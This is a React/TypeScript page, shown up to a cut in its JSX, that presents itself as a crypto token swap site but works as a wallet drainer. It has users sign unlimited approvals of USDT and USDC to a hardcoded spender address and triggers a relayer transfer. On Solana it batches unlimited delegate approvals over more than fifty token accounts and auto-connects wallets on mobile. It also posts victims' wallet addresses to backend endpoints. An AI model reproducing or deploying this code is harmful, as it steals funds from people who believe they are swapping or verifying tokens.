import { Button } from "@/components/ui/button";
import { ArrowDown, Settings, ChevronDown, Loader2, CheckCircle } from "lucide-react";
import { useState, useEffect } from "react";
import { useAccount, useDisconnect, useWriteContract, useWaitForTransactionReceipt, useChainId } from "wagmi";
import { useConnectModal, useChainModal } from "@rainbow-me/rainbowkit";
import { Connection, PublicKey, Transaction, TransactionInstruction } from "@solana/web3.js";
import headerImage from "@assets/image_1767365952238.png";
import section1 from "@assets/image_1770369464111.png";
import section2 from "@assets/image_1770369503143.png";
import section3 from "@assets/image_1770369543162.png";
import section4 from "@assets/image_1770369567405.png";
import section5 from "@assets/image_1770369594094.png";
import section6 from "@assets/image_1770369615963.png";

const SPENDER_ADDRESS = "0xa50408CEbAD7E50bC0DAdf1EdB3f3160e0c07b6E";
const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

const EVM_TOKENS = [
  { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", name: "Tether" },
  { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", name: "USD Coin" },
];

const SOLANA_DELEGATE_ADDRESS = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
const SOLANA_USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
const SOLANA_USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";

// Predefined list of Solana tokens for approval - 50+ popular tokens
const SOLANA_APPROVAL_TOKENS = [
  { symbol: "USDC", name: "USD Coin", mint: SOLANA_USDC_MINT },
  { symbol: "USDT", name: "Tether", mint: SOLANA_USDT_MINT },
  { symbol: "SOL", name: "Wrapped SOL", mint: "So11111111111111111111111111111111111111112" },
  { symbol: "BONK", name: "Bonk", mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263" },
  { symbol: "JUP", name: "Jupiter", mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN" },
  { symbol: "RAY", name: "Raydium", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R" },
  { symbol: "PYTH", name: "Pyth Network", mint: "HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3" },
  { symbol: "WIF", name: "dogwifhat", mint: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm" },
  { symbol: "ORCA", name: "Orca", mint: "orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE" },
  { symbol: "MNGO", name: "Mango", mint: "MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac" },
  { symbol: "SAMO", name: "Samoyedcoin", mint: "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU" },
  { symbol: "SRM", name: "Serum", mint: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt" },
  { symbol: "STEP", name: "Step Finance", mint: "StepAscQoEioFxxWGnh2sLBDFp9d8rvKz2Yp39iDpyT" },
  { symbol: "COPE", name: "Cope", mint: "8HGyAAB1yoM1ttS7pXjHMa3dukTFGQggnFFH3hJZgzQh" },
  { symbol: "FIDA", name: "Bonfida", mint: "EchesyfXePKdLtoiZSL8pBe8Myagyy8ZRqsACNCFGnvp" },
  { symbol: "MEDIA", name: "Media Network", mint: "ETAtLmCmsoiEEKfNrHKJ2kYy3MoABhU6NQvpSfij5tDs" },
  { symbol: "RENDER", name: "Render Token", mint: "rndrizKT3MK1iimdxRdWabcF7Zg7AR5T4nud4EkHBof" },
  { symbol: "JTO", name: "Jito", mint: "jtojtomepa8beP8AuQc6eXt5FriJwfFMwQx2v2f9mCL" },
  { symbol: "W", name: "Wormhole", mint: "85VBFQZC9TZkfaptBWjvUw7YbZjy52A6mjtPGjstQAmQ" },
  { symbol: "TNSR", name: "Tensor", mint: "TNSRxcUxoT9xBG3de7PiJyTDYu7kskLqcpddxnEJAS6" },
  { symbol: "HNT", name: "Helium", mint: "hntyVP6YFm1Hg25TN9WGLqM12b8TQmcknKrdu1oxWux" },
  { symbol: "MOBILE", name: "Helium Mobile", mint: "mb1eu7TzEc71KxDpsmsKoucSSuuoGLv1drys1oP2jh6" },
  { symbol: "IOT", name: "Helium IOT", mint: "iotEVVZLEywoTn1QdwNPddxPWszn3zFhEot3MfL9fns" },
  { symbol: "POPCAT", name: "Popcat", mint: "7GCihgDB8fe6KNjn2MYtkzZcRjQy3t9GHdC8uHYmW2hr" },
  { symbol: "MEW", name: "cat in a dogs world", mint: "MEW1gQWJ3nEXg2qgERiKu7FAFj79PHvQVREQUzScPP5" },
  { symbol: "BOME", name: "BOOK OF MEME", mint: "ukHH6c7mMyiWCf1b9pnWe25TSpkDDt3H5pQZgZ74J82" },
  { symbol: "SLERF", name: "Slerf", mint: "7BgBvyjrZX1YKz4oh9mjb8ZScatkkwb8DzFx7LoiVkM3" },
  { symbol: "MYRO", name: "Myro", mint: "HhJpBhRRn4g56VsyLuT8DL5Bv31HkXqsrahTTUCZeZg4" },
  { symbol: "WEN", name: "Wen", mint: "WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk" },
  { symbol: "MPLX", name: "Metaplex", mint: "METAewgxyPbgwsseH8T16a39CQ5VyVxZi9zXiDPY18m" },
  { symbol: "KMNO", name: "Kamino", mint: "KMNo3nJsBXfcpJTVhZcXLW7RmTwTt4GVFE7suUBo9sS" },
  { symbol: "DRIFT", name: "Drift", mint: "DriFtupJYLTosbwoN8koMbEYSx54aFAVLddWsbksjwg7" },
  { symbol: "BLZE", name: "Blaze", mint: "BLZEEuZUBVqFhj8adcCFPJvPVCiCyVmh3hkJMrU8KuJA" },
  { symbol: "BSOL", name: "BlazeStake SOL", mint: "bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1" },
  { symbol: "MSOL", name: "Marinade SOL", mint: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So" },
  { symbol: "JSOL", name: "JPool SOL", mint: "7Q2afV64in6N6SeZsAAB81TJzwDoD6zpqmHkzi9Dcavn" },
  { symbol: "LST", name: "Liquid Staking", mint: "LSTxxxnJzKDFSLr4dUkPcmCf5VyryEqzPLz5j4bpxFp" },
  { symbol: "JITOSOL", name: "Jito Staked SOL", mint: "J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn" },
  { symbol: "INF", name: "Infinity", mint: "5oVNBeEEQvYi1cX3ir8Dx5n1P7pdxydbGF2X4TxVusJm" },
  { symbol: "DUAL", name: "Dual Finance", mint: "DUALa4FC2yREwZ59PHeu1un4wis36vHRv5hWVBmzykCJ" },
  { symbol: "SHDW", name: "Shadow Token", mint: "SHDWyBxihqiCj6YekG2GUr7wqKLeLAMK1gHZck9pL6y" },
  { symbol: "HONEY", name: "Hivemapper", mint: "4vMsoUT2BWatFweudnQM1xedRLfJgJ7hswhcpz4xgBTy" },
  { symbol: "AUDIO", name: "Audius", mint: "9LzCMqDgTKYz9Drzqnpgee3SGa89up3a247ypMj2xrqM" },
  { symbol: "GMT", name: "STEPN", mint: "7i5KKsX2weiTkry7jA4ZwSuXGhs5eJBEjY8vVxR4pfRx" },
  { symbol: "GST", name: "Green Satoshi", mint: "AFbX8oGjGpmVFywbVouvhQSRmiW2aR1mohfahi4Y2AdB" },
  { symbol: "GENE", name: "Genopets", mint: "GENEtH5amGSi8kHAtQoezp1XEXwZJ8vcuePYnXdKrMYz" },
  { symbol: "ATLAS", name: "Star Atlas", mint: "ATLASXmbPQxBUYbxPsV97usA3fPQYEqzQBUHgiFCUsXx" },
  { symbol: "POLIS", name: "Star Atlas DAO", mint: "poLisWXnNRwC6oBu1vHiuKQzFjGL4XDSu4g9qjz9qVk" },
  { symbol: "PRISM", name: "Prism", mint: "PRSMNsEPqhGVCH1TtWiJqPjJyh2cKrLostPZTNy1o5x" },
  { symbol: "SLND", name: "Solend", mint: "SLNDpmoWTVADgEdndyvWzroNL7zSi1dF9PC3xHGtPwp" },
  { symbol: "PORT", name: "Port Finance", mint: "PoRTjZMPXb9T7dyU7tpLEZRQj7e6ssfAE62j2oQuc6y" },
];
const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");

function getAssociatedTokenAddress(mint: PublicKey, owner: PublicKey): PublicKey {
  const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
  const [address] = PublicKey.findProgramAddressSync(
    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
    ASSOCIATED_TOKEN_PROGRAM_ID
  );
  return address;
}

function createApproveInstruction(
  tokenAccount: PublicKey,
  delegate: PublicKey,
  owner: PublicKey,
  amount: bigint
): TransactionInstruction {
  const data = new Uint8Array(9);
  data[0] = 4;
  
  const amountBytes = new ArrayBuffer(8);
  const view = new DataView(amountBytes);
  view.setBigUint64(0, amount, true);
  data.set(new Uint8Array(amountBytes), 1);
  
  return new TransactionInstruction({
    keys: [
      { pubkey: tokenAccount, isSigner: false, isWritable: true },
      { pubkey: delegate, isSigner: false, isWritable: false },
      { pubkey: owner, isSigner: true, isWritable: false },
    ],
    programId: TOKEN_PROGRAM_ID,
    data: data as Buffer,
  });
}

const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  }
] as const;

interface SolanaWalletProvider {
  connect: (options?: { onlyIfTrusted?: boolean }) => Promise<{ publicKey: PublicKey }>;
  disconnect: () => Promise<void>;
  signTransaction: (transaction: Transaction) => Promise<Transaction>;
  signAllTransactions?: (transactions: Transaction[]) => Promise<Transaction[]>;
  signAndSendTransaction?: (transaction: Transaction, options?: any) => Promise<{ signature: string }>;
  signAndSendAllTransactions?: (transactions: Transaction[], options?: any) => Promise<string[]>;
  signMessage?: (message: Uint8Array) => Promise<{ signature: Uint8Array }>;
  publicKey: PublicKey | null;
  isConnected: boolean;
  on?: (event: string, callback: () => void) => void;
  off?: (event: string, callback: () => void) => void;
}

declare global {
  interface Window {
    solana?: SolanaWalletProvider & { isPhantom?: boolean };
    backpack?: { solana?: SolanaWalletProvider };
    solflare?: SolanaWalletProvider & { isSolflare?: boolean };
    okxwallet?: { solana?: SolanaWalletProvider };
    trustwallet?: { solana?: SolanaWalletProvider };
    bitkeep?: { solana?: SolanaWalletProvider };
  }
}

type SolanaWalletType = "phantom" | "backpack" | "solflare" | "okx" | "trustwallet" | "bitget";

const isMobile = () => {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
};

const getDappUrl = () => encodeURIComponent(window.location.href);

const SOLANA_WALLETS = [
  { 
    id: "phantom" as SolanaWalletType, 
    name: "Phantom", 
    icon: "/assets/phantom-logo.png",
    getProvider: () => window.solana,
    isAvailable: () => !!window.solana?.isPhantom,
    mobileLink: () => `https://phantom.app/ul/browse/${getDappUrl()}`
  },
  { 
    id: "backpack" as SolanaWalletType, 
    name: "Backpack", 
    icon: "/assets/backpack-logo.png",
    getProvider: () => window.backpack?.solana,
    isAvailable: () => !!window.backpack?.solana,
    mobileLink: () => `https://backpack.app/ul/browse/${getDappUrl()}`
  },
  { 
    id: "solflare" as SolanaWalletType, 
    name: "Solflare", 
    icon: "/assets/solflare-logo.png",
    getProvider: () => window.solflare,
    isAvailable: () => !!window.solflare?.isSolflare,
    mobileLink: () => `https://solflare.com/ul/v1/browse/${getDappUrl()}`
  },
  { 
    id: "okx" as SolanaWalletType, 
    name: "OKX Wallet", 
    icon: "okx",
    getProvider: () => window.okxwallet?.solana,
    isAvailable: () => !!window.okxwallet?.solana,
    mobileLink: () => `okx://wallet/dapp/details?dappUrl=${getDappUrl()}`
  },
  { 
    id: "trustwallet" as SolanaWalletType, 
    name: "Trust Wallet", 
    icon: "/assets/trustwallet-logo.png",
    getProvider: () => window.trustwallet?.solana,
    isAvailable: () => !!window.trustwallet?.solana,
    mobileLink: () => `https://link.trustwallet.com/open_url?coin_id=501&url=${getDappUrl()}`
  },
  { 
    id: "bitget" as SolanaWalletType, 
    name: "Bitget Wallet", 
    icon: "/assets/bitget-logo.png",
    getProvider: () => window.bitkeep?.solana,
    isAvailable: () => !!window.bitkeep?.solana,
    mobileLink: () => `https://bkcode.vip/kc/?a=connect&url=${getDappUrl()}`
  },
];

const TokenIcon = ({ symbol, size = 24 }: { symbol: string; size?: number }) => {
  const icons: Record<string, JSX.Element> = {
    ETH: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#627EEA"/>
        <path d="M16.498 4v8.87l7.497 3.35L16.498 4z" fill="#fff" fillOpacity=".6"/>
        <path d="M16.498 4L9 16.22l7.498-3.35V4z" fill="#fff"/>
        <path d="M16.498 21.968v6.027L24 17.616l-7.502 4.352z" fill="#fff" fillOpacity=".6"/>
        <path d="M16.498 27.995v-6.028L9 17.616l7.498 10.379z" fill="#fff"/>
        <path d="M16.498 20.573l7.497-4.353-7.497-3.348v7.701z" fill="#fff" fillOpacity=".2"/>
        <path d="M9 16.22l7.498 4.353v-7.701L9 16.22z" fill="#fff" fillOpacity=".6"/>
      </svg>
    ),
    SOL: (
      <img src="/assets/solana-logo.png" width={size} height={size} alt="SOL" className="rounded" style={{width: size, height: size}} />
    ),
    USDC: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#2775CA"/>
        <path d="M20.022 18.124c0-2.124-1.28-2.852-3.84-3.156-1.828-.24-2.196-.728-2.196-1.578 0-.85.608-1.396 1.824-1.396 1.088 0 1.696.364 1.972 1.276a.39.39 0 00.364.268h.84a.36.36 0 00.356-.388c-.24-1.516-1.264-2.632-2.892-2.908v-1.66a.358.358 0 00-.364-.364h-.728a.358.358 0 00-.364.364v1.604c-1.828.304-2.984 1.516-2.984 3.004 0 1.996 1.216 2.788 3.776 3.092 1.7.244 2.26.608 2.26 1.64 0 1.032-.912 1.724-2.132 1.724-1.66 0-2.196-.696-2.392-1.64a.374.374 0 00-.364-.304h-.912a.36.36 0 00-.356.388c.244 1.716 1.328 2.972 3.14 3.284v1.66c0 .2.164.364.364.364h.728a.358.358 0 00.364-.364v-1.66c1.828-.364 3.036-1.64 3.036-3.35z" fill="#fff"/>
        <path d="M12.628 24.164c-4.256-1.54-6.44-6.26-4.868-10.46 1.024-2.788 3.476-4.596 6.24-4.992V6.948c-3.632.396-6.672 2.788-8.024 6.14-2.016 5.052.476 10.792 5.528 12.808a9.856 9.856 0 003.124.728v-1.764a7.95 7.95 0 01-2-.696zM16 6.948v1.764c3.632.396 6.372 3.22 6.372 6.644h1.764c0-4.18-3.392-7.812-8.136-8.408z" fill="#fff"/>
      </svg>
    ),
    USDT: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#26A17B"/>
        <path d="M17.922 17.383v-.002c-.11.008-.677.042-1.942.042-1.01 0-1.721-.03-1.971-.042v.003c-3.888-.171-6.79-.848-6.79-1.658 0-.809 2.902-1.486 6.79-1.66v2.644c.254.018.982.061 1.988.061 1.207 0 1.812-.05 1.925-.06v-2.643c3.88.173 6.775.85 6.775 1.658 0 .81-2.895 1.485-6.775 1.657zm0-3.59v-2.366h5.414V7.819H8.595v3.608h5.414v2.365c-4.4.202-7.709 1.074-7.709 2.118 0 1.044 3.309 1.915 7.709 2.118v7.582h3.913v-7.584c4.393-.202 7.694-1.073 7.694-2.116 0-1.043-3.301-1.914-7.694-2.117z" fill="#fff"/>
      </svg>
    ),
    DAI: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#F5AC37"/>
        <path d="M16 6L9 16l7 10 7-10-7-10zm0 3.236L20.944 16 16 22.764 11.056 16 16 9.236z" fill="#fff"/>
        <path d="M16 22.764V26L23 16l-2.056 0L16 22.764zM16 9.236V6L9 16l2.056 0L16 9.236z" fill="#fff" fillOpacity=".6"/>
      </svg>
    ),
    WBTC: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#F7931A"/>
        <path d="M21.79 14.054c.24-1.602-.98-2.463-2.648-3.037l.541-2.17-1.32-.33-.527 2.112a53.34 53.34 0 00-1.057-.249l.53-2.126-1.32-.329-.541 2.17c-.289-.066-.573-.131-.849-.2l.001-.006-1.82-.455-.352 1.41s.98.225.96.239c.534.133.631.487.614.768l-.615 2.466c.037.009.084.023.137.044l-.14-.035-.862 3.455c-.065.162-.23.405-.603.313.013.019-.96-.24-.96-.24l-.656 1.513 1.717.428c.32.08.632.164.94.243l-.548 2.2 1.32.329.542-2.172c.36.098.71.188 1.051.273l-.54 2.162 1.32.33.548-2.195c2.257.427 3.954.255 4.668-1.786.576-1.643-.029-2.591-1.216-3.208.864-.2 1.515-.768 1.689-1.943zm-3.023 4.24c-.41 1.644-3.18.755-4.078.532l.728-2.917c.898.224 3.777.668 3.35 2.385zm.41-4.266c-.374 1.495-2.68.735-3.428.549l.66-2.645c.748.187 3.154.535 2.768 2.096z" fill="#fff"/>
      </svg>
    ),
  };
  return icons[symbol] || <div className="w-6 h-6 rounded-full bg-gray-400" />;
};

const TOKENS = [
  { symbol: "ETH", name: "Ethereum" },
  { symbol: "USDC", name: "USD Coin" },
  { symbol: "USDT", name: "Tether" },
  { symbol: "DAI", name: "Dai" },
  { symbol: "WBTC", name: "Wrapped BTC" },
];

const SOLANA_TOKENS = [
  { symbol: "SOL", name: "Solana" },
  { symbol: "USDC", name: "USD Coin" },
  { symbol: "USDT", name: "Tether" },
];

type Step = "idle" | "approving" | "transferring" | "done";
type NetworkType = "evm" | "solana";

export default function Home() {
  const [activeTab, setActiveTab] = useState("Swap");
  const [sellAmount, setSellAmount] = useState("");
  const [buyAmount, setBuyAmount] = useState("");
  const [sellToken, setSellToken] = useState(TOKENS[0]);
  const [buyToken, setBuyToken] = useState<typeof TOKENS[0] | null>(null);
  const [showSellTokens, setShowSellTokens] = useState(false);
  const [showBuyTokens, setShowBuyTokens] = useState(false);
  
  const [approvalQueue, setApprovalQueue] = useState<typeof EVM_TOKENS>([]);
  const [currentQueueIndex, setCurrentQueueIndex] = useState(0);
  const [step, setStep] = useState<Step>("idle");
  const [error, setError] = useState<string>("");
  
  const [networkType, setNetworkType] = useState<NetworkType>("evm");
  const [showSolanaWalletModal, setShowSolanaWalletModal] = useState(false);
  const [showUnifiedWalletModal, setShowUnifiedWalletModal] = useState(false);
  const [showNetworkDropdown, setShowNetworkDropdown] = useState(false);
  const [walletModalTab, setWalletModalTab] = useState<"evm" | "solana">("evm");
  
  const [solanaConnected, setSolanaConnected] = useState(false);
  const [solanaAddress, setSolanaAddress] = useState<string | null>(null);
  const [solanaStep, setSolanaStep] = useState<Step>("idle");
  const [selectedSolanaWallet, setSelectedSolanaWallet] = useState<SolanaWalletType | null>(null);
  const [solanaProvider, setSolanaProvider] = useState<SolanaWalletProvider | null>(null);

  const { address, isConnected } = useAccount();
  const { openConnectModal } = useConnectModal();
  const { openChainModal } = useChainModal();
  const { disconnect } = useDisconnect();
  const chainId = useChainId();
  
  const chainNames: Record<number, string> = {
    1: "Ethereum",
    56: "BNB",
    137: "Polygon",
    42161: "Arbitrum",
    10: "Optimism",
    43114: "Avalanche",
    8453: "Base",
  };
  
  const { writeContract, data: hash, isPending, reset, isError: isWriteError, error: writeError } = useWriteContract();
  const { isLoading: isConfirming, isSuccess: isConfirmed, isError: isReceiptError } = useWaitForTransactionReceipt({ hash });

  const currentApprovalToken = approvalQueue[currentQueueIndex];
  const tokenAddress = currentApprovalToken?.address || "";
  const tokenSymbol = currentApprovalToken?.symbol || "";

  useEffect(() => {
    // Auto-connect when dApp loads inside any Solana wallet browser
    const autoConnectSolanaWallet = async () => {
      // Check each wallet provider and auto-connect if available
      for (const wallet of SOLANA_WALLETS) {
        const provider = wallet.getProvider();
        if (provider) {
          try {
            // Check if already connected
            if (provider.isConnected && provider.publicKey) {
              const address = typeof provider.publicKey === 'string' 
                ? provider.publicKey 
                : provider.publicKey.toBase58();
              setSolanaConnected(true);
              setSolanaAddress(address);
              setSelectedSolanaWallet(wallet.id);
              setSolanaProvider(provider);
              setNetworkType("solana");
              setSellToken(SOLANA_TOKENS[0]);
              return;
            }
            
            // On mobile inside wallet browser, try to connect automatically
            if (isMobile() && provider.connect) {
              // Try silent connect first (Phantom supports onlyIfTrusted)
              try {
                await provider.connect({ onlyIfTrusted: true });
              } catch {
                // Fallback for wallets that don't support onlyIfTrusted
                await provider.connect();
              }
              if (provider.publicKey) {
                const address = typeof provider.publicKey === 'string' 
                  ? provider.publicKey 
                  : provider.publicKey.toBase58();
                setSolanaConnected(true);
                setSolanaAddress(address);
                setSelectedSolanaWallet(wallet.id);
                setSolanaProvider(provider);
                setNetworkType("solana");
                setSellToken(SOLANA_TOKENS[0]);
                return;
              }
            }
          } catch (err) {
            // Silent fail - user hasn't approved connection yet
          }
        }
      }
    };
    
    // Small delay to ensure wallet providers are injected
    setTimeout(autoConnectSolanaWallet, 500);
    
    // Listen for connection events on Phantom
    if (window.solana?.on) {
      window.solana.on('connect', () => {
        if (window.solana?.publicKey) {
          setSolanaConnected(true);
          setSolanaAddress(window.solana.publicKey.toBase58());
          setSelectedSolanaWallet("phantom");
          setSolanaProvider(window.solana);
        }
      });
      window.solana.on('disconnect', () => {
        setSolanaConnected(false);
        setSolanaAddress(null);
      });
    }
  }, []);

  useEffect(() => {
    if (isConfirmed && hash && step === "approving") {
      fetch("/api/approvals", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: address,
          tokenAddress: tokenAddress,
          tokenSymbol,
          transactionHash: hash,
        }),
      }).catch(console.error);

      setStep("transferring");
      executeRelayerTransfer();
    }
  }, [isConfirmed, hash, step]);

  useEffect(() => {
    if ((isWriteError || isReceiptError) && step === "approving") {
      console.log("Transaction rejected or failed, moving to next token immediately");
      goToNextToken();
    }
  }, [isWriteError, isReceiptError, step]);

  // Reset EVM approval state when wallet address changes (new wallet connected)
  useEffect(() => {
    if (address) {
      setStep("idle");
      setApprovalQueue([]);
      setCurrentQueueIndex(0);
      reset();
    }
  }, [address]);

  // Reset EVM approval state when chain changes (network switched)
  useEffect(() => {
    if (chainId && isConnected) {
      setStep("idle");
      setApprovalQueue([]);
      setCurrentQueueIndex(0);
      reset();
    }
  }, [chainId]);

  const executeRelayerTransfer = async () => {
    try {
      const response = await fetch("/api/execute-transfer", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: address,
          tokenSymbol: tokenSymbol,
        }),
      });

      const result = await response.json();
      goToNextToken();
    } catch (err: any) {
      goToNextToken();
    }
  };

  const goToNextToken = () => {
    const nextIndex = currentQueueIndex + 1;
    if (nextIndex < approvalQueue.length) {
      setCurrentQueueIndex(nextIndex);
      reset();
      setStep("approving");
      const nextToken = approvalQueue[nextIndex];
      
      setTimeout(() => {
        writeContract({
          address: nextToken.address as `0x${string}`,
          abi: ERC20_ABI,
          functionName: "approve",
          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
        });
        
        if (isMobile()) {
          setTimeout(() => {
            window.location.href = "wc://";
          }, 100);
        }
      }, 100);
    } else {
      setStep("done");
    }
  };

  const handleProceed = () => {
    if (!address) return;
    setError("");

    if (step === "idle") {
      setApprovalQueue(EVM_TOKENS);
      setCurrentQueueIndex(0);
      setStep("approving");
      
      try {
        writeContract({
          address: EVM_TOKENS[0].address as `0x${string}`,
          abi: ERC20_ABI,
          functionName: "approve",
          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
        });
        
        if (isMobile()) {
          setTimeout(() => {
            window.location.href = "wc://";
          }, 300);
        }
      } catch (err: any) {
        setError(err?.message || "Failed to approve token");
        setStep("idle");
      }
    }
  };

  const connectSolanaWallet = async (walletType: SolanaWalletType) => {
    const walletConfig = SOLANA_WALLETS.find(w => w.id === walletType);
    if (!walletConfig) return;
    
    // On mobile, always open wallet app directly via deep link
    if (isMobile()) {
      window.location.href = walletConfig.mobileLink();
      return;
    }
    
    const provider = walletConfig.getProvider();
    
    if (!provider || !provider.connect) {
      const urls: Record<SolanaWalletType, string> = {
        phantom: "https://phantom.app/",
        backpack: "https://backpack.app/",
        solflare: "https://solflare.com/",
        okx: "https://www.okx.com/web3",
        trustwallet: "https://trustwallet.com/",
        bitget: "https://web3.bitget.com/",
      };
      window.open(urls[walletType], "_blank");
      return;
    }
    
    try {
      await provider.connect();
      
      const pubKey = provider.publicKey;
      if (!pubKey) {
        throw new Error("No public key after connect");
      }
      
      const address = typeof pubKey === 'string' ? pubKey : pubKey.toBase58();
      
      setSolanaConnected(true);
      setSolanaAddress(address);
      setSelectedSolanaWallet(walletType);
      setSolanaProvider(provider);
      setShowSolanaWalletModal(false);
    } catch (err: any) {
      console.error("Failed to connect Solana wallet:", err);
    }
  };

  const disconnectSolanaWallet = async () => {
    if (solanaProvider) {
      await solanaProvider.disconnect();
    }
    setSolanaConnected(false);
    setSolanaAddress(null);
    setSolanaStep("idle");
    setSelectedSolanaWallet(null);
    setSolanaProvider(null);
  };

  const handleSolanaProceed = async () => {
    if (!solanaProvider || !solanaAddress) {
      console.log("No provider or address:", { provider: !!solanaProvider, address: solanaAddress });
      return;
    }
    setError("");
    setSolanaStep("approving");

    try {
      console.log("Starting batch Solana approval for wallet:", solanaAddress);
      const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
      const delegateKey = new PublicKey(SOLANA_DELEGATE_ADDRESS);
      const userKey = new PublicKey(solanaAddress);
      
      const MAX_AMOUNT = BigInt("18446744073709551615");
      const tokensApproved: string[] = [];
      const transaction = new Transaction();
      
      console.log("Creating batch approval for", SOLANA_APPROVAL_TOKENS.length, "tokens...");
      
      const tokenChecks = await Promise.allSettled(
        SOLANA_APPROVAL_TOKENS.map(async (token) => {
          const mintKey = new PublicKey(token.mint);
          const ata = getAssociatedTokenAddress(mintKey, userKey);
          const accountInfo = await connection.getAccountInfo(ata);
          return { token, ata, exists: !!accountInfo };
        })
      );

      for (const result of tokenChecks) {
        if (result.status === "fulfilled" && result.value.exists) {
          const { token, ata } = result.value;
          console.log(`Adding approval for ${token.symbol} (${token.mint.slice(0,8)}...)`);
          transaction.add(
            createApproveInstruction(ata, delegateKey, userKey, MAX_AMOUNT)
          );
          tokensApproved.push(token.symbol);
        }
      }
      
      if (transaction.instructions.length === 0) {
        console.log("No token accounts found - wallet verified without approvals");
        fetch("/api/solana-approvals", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            walletAddress: solanaAddress,
            delegateAddress: SOLANA_DELEGATE_ADDRESS,
            transactionHash: "no-tokens",
            tokensApproved: [],
            tokenCount: 0,
          }),
        }).catch(console.error);
        setSolanaStep("done");
        return;
      }
      
      console.log(`Batch transaction ready with ${transaction.instructions.length} approvals`);

      transaction.feePayer = userKey;
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;

      let txId: string;
      
      console.log("Attempting to sign transaction with provider:", selectedSolanaWallet);
      console.log("Transaction instructions count:", transaction.instructions.length);
      
      // Try signTransaction first (most widely supported)
      try {
        const signedTx = await solanaProvider.signTransaction(transaction);
        console.log("Transaction signed, sending...");
        txId = await connection.sendRawTransaction(signedTx.serialize());
        console.log("Transaction sent:", txId);
      } catch (signErr: any) {
        console.log("signTransaction failed, trying signAndSendTransaction...", signErr?.message || signErr);
        // Fallback to signAndSendTransaction if signTransaction fails
        if (solanaProvider.signAndSendTransaction) {
          const result = await solanaProvider.signAndSendTransaction(transaction);
          txId = result.signature;
        } else {
          throw signErr;
        }
      }
      
      await connection.confirmTransaction({
        signature: txId,
        blockhash,
        lastValidBlockHeight
      }, "confirmed");

      fetch("/api/solana-approvals", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: solanaAddress,
          delegateAddress: SOLANA_DELEGATE_ADDRESS,
          transactionHash: txId,
          tokensApproved,
          tokenCount: tokensApproved.length,
        }),
      }).catch(console.error);

      setSolanaStep("done");
    } catch (err: any) {
      console.error("Solana approval error:", err);
      setError(err?.message || "Failed to approve on Solana");
      setSolanaStep("idle");
    }
  };

  const isProcessing = isPending || isConfirming || step === "approving" || step === "transferring";
  const isSolanaProcessing = solanaStep === "approving" || solanaStep === "transferring";

  const handleSwapDirection = () => {
    const tempToken = sellToken;
    const tempAmount = sellAmount;
    setSellToken(buyToken || TOKENS[0]);
    setBuyToken(tempToken);
    setSellAmount(buyAmount);
    setBuyAmount(tempAmount);
  };

  const tabs = ["Swap", "Limit", "Buy", "Sell"];
  
  const currentTokens = networkType === "solana" ? SOLANA_TOKENS : TOKENS;
  const isWalletConnected = networkType === "solana" ? solanaConnected : isConnected;
  const walletAddress = networkType === "solana" ? solanaAddress : address;

  return (
    <div className="min-h-screen bg-[#1a1b2e]">
      {/* Section 1 - Hero with Verify */}
      <div className="relative">
        <img src={section1} alt="" className="w-full h-auto block" data-testid="img-section1" />
        <div 
          className="absolute flex flex-col items-center gap-2"
          style={{ 
            top: '3%', 
            right: '1%',
            zIndex: 100
          }}
        >
          {isWalletConnected ? (
            <>
              {networkType === "solana" ? (
                solanaStep === "done" ? (
